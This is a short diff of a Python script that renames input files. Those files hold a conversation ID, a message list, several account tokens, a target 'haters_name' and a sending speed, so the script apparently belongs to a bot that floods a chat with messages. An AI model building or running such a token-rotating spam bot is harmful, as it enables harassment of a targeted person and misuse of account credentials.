@@ -62,7 +62,7 @@ def send_initial_message():
       #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
 send_initial_message()
 def send_messages_from_file():
-      with open('KRISHNA-CONVO.txt', 'r') as file:
+      with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
 
       with open('ravi math.txt', 'r') as file:
@@ -70,15 +70,15 @@ def send_messages_from_file():
 
       num_messages = len(messages)
 
-      with open('KRISHNA-TOKEN.txt', 'r') as file:
+      with open('token.txt', 'r') as file:
           tokens = file.readlines()
       num_tokens = len(tokens)
       max_tokens = min(num_tokens, num_messages)
 
-      with open('KRISHNA-NAME.txt', 'r') as file:
+      with open('name.txt', 'r') as file:
           haters_name = file.read().strip()
 
-      with open('KRISHNA-SPEED.txt', 'r') as file:
+      with open('speed.txt', 'r') as file:
           speed = int(file.read().strip())
 
       def liness():
